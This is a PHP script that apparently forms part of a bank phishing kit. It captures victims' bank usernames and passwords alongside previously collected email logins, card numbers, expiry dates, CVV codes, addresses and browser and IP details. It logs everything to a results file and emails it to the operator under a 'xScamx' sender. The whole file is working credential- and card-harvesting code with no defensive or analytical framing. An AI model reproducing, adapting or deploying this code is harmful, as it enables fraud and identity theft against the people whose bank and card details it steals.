<?php

session_start();
error_reporting(0);

require_once __DIR__.'/functions.php';

if (isset($_POST['bnkuser']) || isset($_POST['bnkpass']))
{
	if (!empty($_POST['bnkuser']) || !empty($_POST['bnkpass']))
	{

		$_SESSION['bnkuser']   = $_POST['bnkuser'];
		$_SESSION['bnkpass']   = $_POST['bnkpass'];


		$RezltMessage = 
		"
		<!DOCTYPE html><html><head><title></title><style type='text/css'>*{font-family: arial;}body{background: #f7f7f7;}table tr td{padding: 5px;}table{width: 600px;}.td1{width: 30%;font-weight: bold;}.td2{width: 70%;}.content{ width: 600px; background: #fff;}.title{ padding: 8px; background: black; color: #fff; font-weight: bold; letter-spacing: 3px;}.row { display: table-row; background: #ffffff;}.row:nth-of-type(odd) { background: #e9e9e9;}@media screen and (max-width: 600px) { table { width: 100%; } .content{ width: 100%; }}</style></head><body><center><br><br><br>
		<div class='content'>
			<div class='title'>LOGIN INFO</div>
			<table>
				<tr class='row'>
					<td class='td1'>Email</td>
					<td class='td2'>{$_SESSION['EM']}</td>
				</tr>
				<tr class='row'>
					<td class='td1'>Password</td>
					<td class='td2'>{$_SESSION['PW']}</td>
				</tr>
			</table>
			<div class='title'>BANK LOGIN</div>
			<table>
				<tr class='row'>
					<td class='td1'>Bin</td>
					<td class='td2'>{$_SESSION['Bin']->issuer}</td>
				</tr>
				<tr class='row'>
					<td class='td1'>Username</td>
					<td class='td2'>{$_POST['bnkuser']}</td>
				</tr>
				<tr class='row'>
					<td class='td1'>Password</td>
					<td class='td2'>{$_SESSION['bnkpass']}</td>
				</tr>
			</table>
			<div class='title'>BILLING AND CARD</div>
			<table>
				<tr class='row'>
					<td class='td1'>First Name</td>
					<td class='td2'>{$_SESSION['Fn']}</td>
				</tr>
				<tr class='row'>
					<td class='td1'>Last Name</td>
					<td class='td2'>{$_SESSION['Ln']}</td>
				</tr>
				<tr class='row'>
					<td class='td1'>City</td>
					<td class='td2'>{$_SESSION['city']}</td>
				</tr>
				<tr class='row'>
					<td class='td1'>State</td>
					<td class='td2'>{$_SESSION['state']}</td>
				</tr>
				<tr class='row'>
					<td class='td1'>Zip</td>
					<td class='td2'>{$_SESSION['zip']}</td>
				</tr>
				<tr class='row'>
					<td class='td1'>Country</td>
					<td class='td2'>{$_SESSION['countryx']}</td>
				</tr>
				<tr class='row'>
					<td class='td1'>Address</td>
					<td class='td2'>{$_SESSION['address']}</td>
				</tr>
				<tr class='row'>
					<td class='td1'>Card Number</td>
					<td class='td2'>{$_SESSION['Nu']}</td>
				</tr>
				<tr class='row'>
					<td class='td1'>Exp Date</td>
					<td class='td2'>{$_SESSION['EpMo']}/{$_SESSION['EpYr']}</td>
				</tr>
				<tr class='row'>
					<td class='td1'>CSC/CVV</td>
					<td class='td2'>{$_SESSION['C5c']}</td>
				</tr>
				<tr class='row'>
					<td class='td1'>Bin</td>
					<td class='td2'>{$_SESSION['Bin']->issuer}</td>
				</tr>
			</table>
			<div class='title'>MACHINE INFO</div>
			<table>
				<tr class='row'>
					<td class='td1'>IP</td>
					<td class='td2'><a href='http://geoiptool.com/?ip={$_SERVER['REMOTE_ADDR']}'>{$_SERVER['REMOTE_ADDR']}</a></td>
				</tr>
				<tr class='row'>
					<td class='td1'>COUNTRY</td>
					<td class='td2'>{$_SESSION['country']}</td>
				</tr>
				<tr class='row'>
					<td class='td1'>BROWSER</td>
					<td class='td2'>{$_SERVER['HTTP_USER_AGENT']}</td>
				</tr>
				<tr class='row'>
					<td class='td1'>BROWSER LANG</td>
					<td class='td2'>{$_SERVER['HTTP_ACCEPT_LANGUAGE']}</td>
				</tr>
				<tr class='row'>
					<td class='td1'>DATE</td>
					<td class='td2'>".date('Y-m-d', time())." ".date('H:i:s', time())."</td>
				</tr>
			</table>
		</div>
		</center></body></html>
		";

		$RezltHeader = "MIME-Version: 1.0" . "\r\n";
		$RezltHeader .= "Content-type:text/html;charset=UTF-8" . "\r\n";
		$RezltHeader .= 'From: xScamx <miakhalifa@brazzers.com>' . "\r\n";

		$RezltSubject = "New Bank-Login From [ ".$_SESSION['country']." - ".$_SERVER['REMOTE_ADDR']." ]";

$TextContent = "
======== LOGIN ========
Email      : ".$_SESSION['EM']."
Password   : ".$_SESSION['PW']."
======== BANKINFO ========
Bin        : ".$_SESSION['Bin']->issuer."
Username   : ".$_POST['bnkuser']."
Password   : ".$_POST['bnkpass']."
======== CARD ========
CardNumber : ".$_SESSION['Nu']."
Exp Date   : ".$_SESSION['EpMo']."/".$_SESSION['EpYr']."
CSC/CVV    : ".$_SESSION['C5c']."
======== ADDRESS ========
First Name : ".$_SESSION['Fn']."
Last Name  : ".$_SESSION['Ln']."
City       : ".$_SESSION['city']."
State      : ".$_SESSION['state']."
Zip        : ".$_SESSION['zip']."
Country    : ".$_SESSION['countryx']."
Address    : ".$_SESSION['address']."
======== MACHINE ========
IP         : http://geoiptool.com/?ip=".$_SERVER['REMOTE_ADDR']."
COUNTRY    : ".$_SESSION['country']."
BROWSER    : ".$_SERVER['HTTP_USER_AGENT']."
BROW.LANG  : ".$_SERVER['HTTP_ACCEPT_LANGUAGE']."
DATE       : ".date('Y-m-d', time())." ".date('H:i:s', time())."


";

		$SaveResult = fopen('../../rezlt.txt', 'a');
		fwrite($SaveResult, $TextContent);
		fclose($SaveResult);

		@mail($to, $RezltSubject, $RezltMessage, $RezltHeader);

		$json['status'] = 'success';
		echo json_encode($json);
	}
}
